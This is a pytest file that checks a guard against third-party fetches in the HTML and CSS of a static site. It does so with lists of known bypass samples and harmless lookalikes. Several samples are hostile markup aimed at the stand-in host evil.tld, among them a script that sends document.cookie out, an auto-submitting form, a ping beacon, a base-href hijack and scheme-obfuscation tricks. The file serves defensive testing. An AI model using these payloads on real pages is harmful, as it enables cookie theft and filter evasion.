"""The guard has been found incomplete five times. It is tested by its bypasses."""
import pytest

from conftest import external_bases, stylesheet_hosts, third_party_hosts

SELF = {"genai-security-project.github.io"}

MUST_CATCH = {
    "base href": '<base href="https://evil.tld/"><img src="logo.png">',
    "inline script body": '<script>fetch("https://evil.tld/b?"+document.cookie)</script>',
    "svg use href": '<svg><use href="https://evil.tld/s.svg#x"></use></svg>',
    "svg image href": '<svg><image href="https://evil.tld/i.png"/></svg>',
    "meta refresh": '<meta http-equiv="refresh" content="0;url=https://evil.tld/">',
    "css image-set": '<style>b{background:image-set("https://evil.tld/a.png" 1x)}</style>',
    "tab inside the scheme": '<img src="ht\tps://evil.tld/x.png">',
    "second attribute on one tag":
        '<video src="//genai-security-project.github.io/a.mp4" poster="//evil.tld/b.jpg">',
    "anchor ping": '<a href="/local" ping="https://evil.tld/beacon">x</a>',
    "unquoted src": "<img src=//evil.tld/x.png>",
    "srcset second url": '<img srcset="/a.png 1x, //evil.tld/b.png 2x">',
    "link stylesheet": '<link rel="stylesheet" href="https://evil.tld/s.css">',
    "iframe": '<iframe src="https://evil.tld/f"></iframe>',
    "object data": '<object data="https://evil.tld/o"></object>',
    "auto-submitted form":
        '<form id="f" action="https://evil.tld/collect"></form>'
        '<script>document.getElementById("f").submit()</script>',
    "input formaction": '<input type="submit" formaction="https://evil.tld/go">',
    "anchor rel=prefetch": '<a rel="prefetch" href="https://evil.tld/x">y</a>',
    "anchor rel=preconnect": '<a rel="preconnect" href="https://evil.tld/">y</a>',
    "entity-encoded scheme": '<img src="&#104;ttps://evil.tld/x.png">',
    "uppercase scheme": '<img src="HTTPS://evil.tld/x.png">',
    # HTML honors a self-closing slash only on void and foreign elements, so a
    # browser ignores it here and runs the body. Python's parser reports these
    # through a different handler, which is how an earlier version missed them.
    "self-closed script with a body": '<script/>fetch("https://evil.tld/x")</script>',
    "self-closed style with a body":
        '<style/>body{background:url(https://evil.tld/z.png)}</style>',
}

MUST_IGNORE = {
    "prose anchor": '<p>See <a href="https://github.com/owasp/x">the repo</a>.</p>',
    "blockquote cite": '<blockquote cite="https://example.org/z">q</blockquote>',
    "self-hosted asset": '<img src="https://genai-security-project.github.io/a.png">',
    "relative asset": '<img src="assets/a.png"><link rel="stylesheet" href="s.css">',
    "javascript line comment": "<script>\n// see https not a url\nvar x=1;\n</script>",
    "svg namespace": '<svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>',
    "anchor rel=noopener": '<a href="https://github.com/x" rel="noopener">r</a>',
    "anchor rel=edit": '<a href="https://github.com/x/edit" rel="edit">e</a>',
    "html comment": "<!-- https://evil.tld/x --><p>ok</p>",
}

CSS_CATCH = {
    "url absolute": "a{background:url(https://evil.tld/x.png)}",
    "url protocol-relative": "a{background:url(//evil.tld/x.png)}",
    "import string": '@import "https://evil.tld/s.css";',
    "import url": "@import url(//evil.tld/s.css);",
    "image-set": 'a{background:image-set("https://evil.tld/a.png" 1x)}',
    "font-face src": "@font-face{src:url(https://evil.tld/f.woff2)}",
}

CSS_IGNORE = {
    "data uri holding an svg":
        "a{background:url(\"data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'/>\")}",
    "licence comment": "/* icons from https://fontawesome.com */a{color:red}",
    "self host": "a{background:url(https://genai-security-project.github.io/a.png)}",
    "relative": "a{background:url(../img/a.png)}",
}


@pytest.mark.parametrize("markup", MUST_CATCH.values(), ids=list(MUST_CATCH))
def test_every_known_bypass_is_caught(markup):
    assert "evil.tld" in third_party_hosts(markup, SELF)


@pytest.mark.parametrize("markup", MUST_IGNORE.values(), ids=list(MUST_IGNORE))
def test_prose_and_self_hosted_references_are_not_fetches(markup):
    assert third_party_hosts(markup, SELF) == set()


@pytest.mark.parametrize("css", CSS_CATCH.values(), ids=list(CSS_CATCH))
def test_stylesheet_fetches_are_caught(css):
    assert "evil.tld" in stylesheet_hosts(css, SELF)


@pytest.mark.parametrize("css", CSS_IGNORE.values(), ids=list(CSS_IGNORE))
def test_stylesheet_non_fetches_are_ignored(css):
    """A data: payload and a licence banner carry URLs that fetch nothing.

    Flagging them is what makes a team switch a guard off.
    """
    assert stylesheet_hosts(css, SELF) == set()


def test_a_base_element_is_named_by_its_own_check():
    """base rewrites resolution for the whole page, so every relative URL leaves it.

    No host appears in any other attribute afterwards, which is why a host-matching
    guard can never see it.
    """
    assert external_bases('<base href="https://evil.tld/"><img src="logo.png">')


def test_a_namespace_declaration_cannot_smuggle_a_fetch():
    markup = '<svg xmlns="http://www.w3.org/2000/svg"><use href="https://evil.tld/s#x"/></svg>'
    assert "evil.tld" in third_party_hosts(markup, SELF)
